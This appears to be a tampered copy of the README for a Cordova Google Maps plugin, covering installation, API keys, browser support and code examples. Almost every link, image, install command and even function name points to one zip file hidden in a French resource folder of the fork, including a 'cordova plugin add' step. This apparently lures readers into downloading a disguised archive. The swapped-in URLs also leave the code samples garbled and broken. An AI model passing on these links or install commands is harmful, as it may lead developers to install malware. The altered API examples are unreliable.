# Cordova GoogleMaps plugin for Android, iOS and Browser v2.6.2

| Download | Build test (master branch)|
|----------|---------------------------|
| [![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip) |[![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip) |

  This plugin displays Google Maps in your application.
  This plugin uses these libraries for each platforms:

  - Android : [Google Maps Android API](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
  - iOS : [Google Maps SDK for iOS](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
  - Browser : [Google Maps JavaScript API v3](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)

  Both [PhoneGap](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip) and [Apache Cordova](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip) are supported.

<table>
<tr>
<td>
<h3>Android, iOS</h3>
<img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"  height="300">
</td>
<td>
<h3>Browser</h3>
<img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip" height="300">
</td>
</tr>
</table>

-----

## Guides

  - [How to generate API keys?](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
  - [Hello, World](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
  - [Hello, World (with PhoneGap Build)](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
  - [Trouble shootings](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)

## Quick install

  - *Stable version(npm)*
    ```
    $> cordova plugin add cordova-plugin-googlemaps
    ```

  - *Development version(beta version)*
    ```
    $> cordova plugin add https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip
    ```

## PhoneGap Build settings

  ```xml
  <widget ...>

    <!--
      You need to specify cli-7.1.0 or greater version.
      https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip
    -->
    <preference name="phonegap-version" value="cli-8.1.1" />
  </widget>
  ```

## Install optional variables

  - ![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip) **PLAY_SERVICES_VERSION = (15.0.1)**<br>
    The Google Play Services SDK version.
    _You need to specify the same version number with all other plugins._
    Check out the latest version [here](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip).

  - ![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip) **ANDROID_SUPPORT_V4_VERSION = (27.1.1)**<br>
    This plugin requires the Android support library v4.
    _The minimum version is 24.1.0._
    Check out the latest version [here](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip).

  - ![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip) **LOCATION_WHEN_IN_USE_DESCRIPTION**<br>
    This message is displayed when your application requests **LOCATION PERMISSION for only necessary times**.

  - ![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip) **LOCATION_ALWAYS_USAGE_DESCRIPTION**<br>
    This message is displayed when your application requests **LOCATION PERMISSION for always**.

---------------------------------------------------------------------------------------------------------

## Browser platform

  We support browser platform now!
  You can develop your application with browser, then run it!
  At the end of development, you can upload the html files to your server, or run it on Android or iOS devices.

  ```
  $> cordova run browser
  ```

  If you use [ionic framework](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip), it supports `live-reload`.

  ```
  $> ionic cordova run browser -l
  ```

  If you want to use `live-reload`, but you don't want to use other framework or without framework,
  [cordova-plugin-browsersync](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip) is useful.

  ```
  $> cordova plugin add cordova-plugin-browsersync

  $> cordova run (browser/android/ios) -- --live-reload
  ```


### API key (Android and iOS platforms)

  As of v2.6.0, you need to specify your API keys in `https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip` file instead of `--variable`.
  This allows you to change your API keys for anytime without reinstallation.

  Please pay attention the variable names are changed.

  ```xml
  <widget ...>
    <preference name="GOOGLE_MAPS_ANDROID_API_KEY" value="(api key)" />
    <preference name="GOOGLE_MAPS_IOS_API_KEY" value="(api key)" />
  </widget>
  ```

### API key (Browser platform)

  In the browser platform, the maps plugin uses [Google Maps JavaScript API v3](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)

  You need to set **two API keys for Google Maps JavaScript API v3**.

  ```js
  // If your app runs this program on browser,
  // you need to set `API_KEY_FOR_BROWSER_RELEASE` and `API_KEY_FOR_BROWSER_DEBUG`
  // before `https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip()`
  //
  //   API_KEY_FOR_BROWSER_RELEASE for `https:` protocol
  //   API_KEY_FOR_BROWSER_DEBUG for `http:` protocol
  //
  https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip({
    'API_KEY_FOR_BROWSER_RELEASE': '(YOUR_API_KEY_IS_HERE)',
    'API_KEY_FOR_BROWSER_DEBUG': ''
  });

  // Create a Google Maps native view under the map_canvas div.
  var map = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(div);

  ```

### Why **two API keys**?

  `JavaScript` code is `text code`. Even if you do obfuscation, it's still readable finally.
  In order to protect your API key, you need to set `Key restriction` for these keys.

  ![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)

  If you don't set API key, the maps plugin still work with `development mode`.

  ```js
  https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip({
    'API_KEY_FOR_BROWSER_RELEASE': '(YOUR_API_KEY_IS_HERE)',
    'API_KEY_FOR_BROWSER_DEBUG': '' // If key is empty or unset,
                                    // the maps plugin runs under the development mode.
  });
  ```
  <img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip" width="300">

### Which browser supported?

  Modern browsers should work without any problem.

  ![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)

  Internet Explorer 11 might work. We don't confirm all features, but basic features work.

### Behavior differences

  `Google Maps JavaScript API v3` is completely different ecosystem with `Google Maps Android API` and `Google Maps SDK for iOS`.

  `Google Maps JavaScript API v3` :
  - **can't** draw 3D building,
  - **does't work** if offline,
  - **can't** map rotation,
  - etc...

  In the browser platform, the maps plugin works almost the same behaviors as native platforms(Android, and iOS),
  but not exactly the same behaviors.
  So don't expect too much.

### Touch mechanism difference

  As you may know, [this plugin displays native Google Maps view under the browser in Android and iOS](#how-does-this-plugin-work-android-ios).
  However this plugin displays as `normal HTML element` in browser platform.

  Because of this, touch behavior is different.
  The maps plugin does not hook the touch position, do not set `background: transparent`, ... etc.
  But if you use this plugin as normal behavior, you don't need to consider about this.

---------------------------------------------------------------------------------------------------------

## Please support this plugin activity.

  In order to keep this plugin as free, please consider to donate little amount for this project.

  [![Donate](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip%2dgooglemaps%2dplugin&currency_code=USD&bn=PP%2dDonationsBF%3abtn_donate_SM%2egif%3aNonHosted)

---------------------------------------------------------------------------------------------------------

## Release Notes
  - **v2.6.1**
    - Fix: (Android) build error

  - **v2.6.1**
    - Fix: (Android) Conflicting with `OneSignal-Cordova-SDK`
    - Fix: (iOS) App crashes when marker url isn't valid.

  - **v2.6.0**
    - Fix: Can not install to Cordova 9.0 project
    - Fix: (Android) `ConcurrentModificationException` error at `onStop`
    - Fix: (Android) Polygon becomes visible when you run `setPoints()` to invisible polygon
    - Fix: (Android/iOS) TileOverlay does not work when your app runs on `file:` protocol with ionic.
    - Update: (iOS) Specify the Google Maps SDK version as `=> 3.1.0`. Please use `cordova-ios@5.0.0` or above, otherwise modify `platform/ios/Podfile`.
    - Add: (Android/iOS) API Key mechanism

---------------------------------------------------------------------------------------------------------

## Demos


[Demo (Browser)](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)

![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)


---------------------------------------------------------------------------------------------------------

## Documentation

![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)

[All documentations are here!!](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)

https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip

**Quick examples**
<table>
<tr>
  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>Map</a></td>
  <td><pre>
var options = {
  camera: {
    target: {lat: ..., lng: ...},
    zoom: 19
  }
};
var map = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(mapDiv, options)</pre></td>
</tr>
<tr>
  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>Marker</a></td>
  <td><pre>
var marker = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip({
  position: {lat: ..., lng: ...},
  title: "Hello Cordova Google Maps for iOS and Android",
  snippet: "This plugin is awesome!"
})</pre></td>
</tr>
<tr>
  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>MarkerCluster</a></td>
  <td><pre>
var markerCluster = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip({
  //maxZoomLevel: 5,
  boundsDraw: true,
  markers: dummyData(),
  icons: [
      {min: 2, max: 100, url: "https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip", anchor: {x: 16, y: 16}},
      {min: 100, max: 1000, url: "https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip", anchor: {x: 16, y: 16}},
      {min: 1000, max: 2000, url: "https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip", anchor: {x: 24, y: 24}},
      {min: 2000, url: "https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip",anchor: {x: 32,y: 32}}
  ]
});</pre></td>
</tr>
<tr>
  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>HtmlInfoWindow</a></td>
  <td><pre>
var html = "&lt;img src='https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip' width='64' height='64' &gt;" +
           "&lt;br&gt;" +
           "This is an example";
https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(html);
https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(marker);
</pre></td>
</tr>
<tr>
  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>Circle</a></td>
  <td><pre>
var circle = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip({
  'center': {lat: ..., lng: ...},
  'radius': 300,
  'strokeColor' : '#AA00FF',
  'strokeWidth': 5,
  'fillColor' : '#880000'
});</pre></td>
</tr>
<tr>
  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>Polyline</a></td>
  <td><pre>
var polyline = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip({
  points: AIR_PORTS,
  'color' : '#AA00FF',
  'width': 10,
  'geodesic': true
});</pre></td>
</tr>
<tr>
  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>Polygon</a></td>
  <td><pre>
var polygon = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip({
  'points': GORYOKAKU_POINTS,
  'strokeColor' : '#AA00FF',
  'strokeWidth': 5,
  'fillColor' : '#880000'
});</pre></td>
</tr>
<tr>
  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>GroundOverlay</a></td>
  <td><pre>
var groundOverlay = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip({
  'url': "https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip",
  'bounds': [
    {"lat": 40.712216, "lng": -74.22655},
    {"lat": 40.773941, "lng": -74.12544}
  ],
  'opacity': 0.5
});
</pre></td>
</tr>
<tr>
  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>TileOverlay</a></td>
  <td><pre>
var tileOverlay = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip({
  debug: true,
  opacity: 0.75,
  getTile: function(x, y, zoom) {
    return "../images/map-for-free/" + zoom + "_" + x + "-" + y + ".gif"
  }
});</pre></td>
</tr>
<tr>
  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>KmlOverlay</a></td>
  <td><pre>
https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip({
  'url': 'https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip'
}, function(kmlOverlay) { ... });</pre></td>
</tr>
<tr>
  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>Geocoder</a></td>
  <td><pre>
https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip({
  // US Capital cities
  "address": [
    "Montgomery, AL, USA", ... "Cheyenne, Wyoming, USA"
  ]
}, function(mvcArray) { ... });</pre></td>
</tr>
<tr>
  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>poly utility</a></td>
  <td><pre>
var GORYOKAKU_POINTS = [
  {lat: 41.79883, lng: 140.75675},
  ...
  {lat: 41.79883, lng: 140.75673}
]
var contain = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(
                    position, GORYOKAKU_POINTS);
https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(contain ? "blue" : "red");
</pre></td>
</tr>
<tr>
  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>encode utility</a></td>
  <td><pre>
var GORYOKAKU_POINTS = [
  {lat: 41.79883, lng: 140.75675},
  ...
  {lat: 41.79883, lng: 140.75673}
]
var encodedPath = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip
                       https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(GORYOKAKU_POINTS);
</pre></td>
</tr>
<tr>
  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>spherical utility</a></td>
  <td><pre>
var heading = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(
                        https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(), https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip());
https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip = "heading : " + https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(0) + "&deg;";
</pre></td>
</tr>
<tr>
  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>Location service</a></td>
  <td><pre>
https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(function(result) {
  alert(["Your current location:\n",
      "latitude:" + https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(3),
      "longitude:" + https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(3),
      "speed:" + https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip,
      "time:" + https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip,
      "bearing:" + https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip].join("\n"));
});
</pre></td>
</tr>

<tr>
  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>StreetView</a></td>
  <td><pre>
var div = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip("pano_canvas1");
var panorama = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(div, {
  camera: {
    target: {lat: 42.345573, lng: -71.098326}
  }
});</pre></td>
</tr>
</table>


---------------------------------------------------------------------------------------------------------

### What is the difference between this plugin and Google Maps JavaScript API v3?

Google Maps JavaScript API v3 works on any platforms,
but it does not work if device is **offline**.

This plugin uses three different APIs:
- Android : [Google Maps Android API](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
- iOS : [Google Maps SDK for iOS](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
- Browser : [Google Maps JavaScript API v3](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)

In Android and iOS applications, this plugin displays native Google Maps views, which is **faster** than Google Maps JavaScript API v3.
And it even works if the device is **offline**.

In Browser platform, this plugin displays JS map views (Google Maps JavaScript API v3).
It should work as PWA (progressive web application), but the device has to be **online**.

In order to work for all platforms, this plugin provides **own API** instead of each original APIs.
You can write your code `similar to` the Google Maps JavaScript API v3.

**Feature comparison table**

|                | Google Maps JavaScript API v3     | Cordova-Plugin-GoogleMaps(Android,iOS)| Cordova-Plugin-GoogleMaps(Browser)    |
|----------------|-----------------------------------|---------------------------------------|---------------------------------------|
|Rendering system| JavaScript + HTML                 | JavaScript + Native API's             | JavaScript                            |
|Offline map     | Not possible                      | Possible (only your displayed area)   | Not possible                          |
|3D View         | Not possible                      | Possible                              | Not possible                          |
|Platform        | All browsers                      | Android and iOS applications only     | All browsers                          |
|Tile image      | Bitmap                            | Vector                                | Bitmap                                |

**Class comparison table**

| Google Maps JavaScript API v3     | Cordova-Plugin-GoogleMaps             |
|-----------------------------------|---------------------------------------|
| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip                   | Map                                   |
| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip                | Marker                                |
| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip            | Default InfoWindow, and HtmlInfoWindow|
| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip                | Circle                                |
| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip             | Polygon                               |
| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip              | Polyline                              |
| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip               | Polygon                               |
| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip         | GroundOverlay                         |
| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip          | TileOverlay                           |
| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip             | BaseClass                             |
| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip              | BaseArrayClass                        |
| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip              | https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip           |
| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip    | https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip |
| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip     | https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip  |
| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip         | https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip      |
| (not available)                   | MarkerCluster                         |
| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip              | KmlOverlay                            |
| (not available)                   | LocationService                       |
| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip            | StreetView :sparkles:                 |
